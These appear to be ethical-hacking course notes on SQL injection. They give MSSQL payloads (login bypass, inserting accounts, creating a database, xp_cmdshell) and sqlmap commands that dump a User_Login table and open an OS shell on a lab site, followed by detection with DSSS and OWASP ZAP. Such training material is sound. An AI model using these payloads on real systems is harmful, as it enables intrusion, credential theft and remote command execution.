# 15: SQL Injection

Types:
- In-band SQL injection
- Blind/inferential SQL injection (no error messages from the system)
- Out-of-band SQL injection (such as database email functionality, or file writing and loading functions)

## Perform Attacks

### Attack MSSQL
``` blah' or 1=1 -- ```

``` blah';insert into login values ('john','apple123'); -- ```

``` blah';create database mydatabase; --  ```

``` blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; -- ```

### Extract Databases by sqlmap

``` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value copied]" --dbs ```\
- get databases, and information about the web server OS, web application technology, and the backend DBMS.

``` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value copied]" -D moviescope --tables ```\
- -D specifies the DBMS database to enumerate 
- --tables enumerates DBMS database tables

``` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value copied]" -D moviescope -T User_Login --dump ```\
- Dump the table named "User_Login"

``` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value copied]" --os-shell ```
- --os-shell is the prompt for an interactive OS shell

``` os-shell> TASKLIST ```

### Other SQL injection tools
- Mole (https://sourceforge.net), 
- Blisqy (https://github.com), 
- blind-sql-bitshifting (https://github.com), 
- bsql (https://github.com), and 
- NoSQLMap (https://github.com) 

## Detect SQL Injection Vulnerabilities

By monitoring HTTP traffic, SQL injection attack vectors, and determining if a web application or database code contains SQL injection vulnerabilities.

### Damn Small SQLi Scanner (DSSS)

``` cd DSSS ```

``` python3 dsss.py ```

``` python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie copied]" ```
- -u specifies the target URL. 
- --cookie specifies the HTTP cookie header value.
- then shows that the target website is vulnerable to blind SQL injection attacks.

### OWASP ZAP

Quick Start -> Automated Scan -> URL to attack -> Attack -> "Alerts" -> SQL Injection

### Other tools
- Acunetix Web Vulnerability Scanner (https://www.acunetix.com)
- Snort (https://snort.org)
- Burp Suite (https://www.portswigger.net)
- w3af (http://w3af.org) 
- Netsparker Web Application Security Scanner (https://www.netsparker.com)
